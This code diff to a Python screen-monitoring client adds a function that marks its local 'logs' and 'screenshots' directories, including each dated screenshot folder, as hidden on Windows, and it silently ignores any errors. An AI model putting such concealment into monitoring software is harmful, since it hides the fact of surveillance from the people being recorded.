@@ -102,9 +102,21 @@ if not server_only:
     register_device()
     threading.Thread(target=check_disabled_status_loop, daemon=True).start()
 
+def hide_directory(path):
+    """Sets a directory attribute to hidden in Windows (NT)."""
+    try:
+        if os.name == 'nt' and os.path.exists(path):
+            import ctypes
+            # FILE_ATTRIBUTE_HIDDEN = 0x02
+            ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)
+    except Exception:
+        pass
+
 # Initialize logs and screenshots directories (kept for fallback / temp storage)
 os.makedirs("logs", exist_ok=True)
+hide_directory("logs")
 os.makedirs("screenshots", exist_ok=True)
+hide_directory("screenshots")
 
 # Initialize global activity timers
 last_activity_time = datetime.now()
@@ -2127,6 +2139,7 @@ def capture_and_upload_screenshot(prefix):
     # 1. Local paths
     local_dir = os.path.join("screenshots", date_str)
     os.makedirs(local_dir, exist_ok=True)
+    hide_directory(local_dir)
     filename = f"{prefix}_{timestamp_file}.webp"
     local_path = os.path.join(local_dir, filename)
     
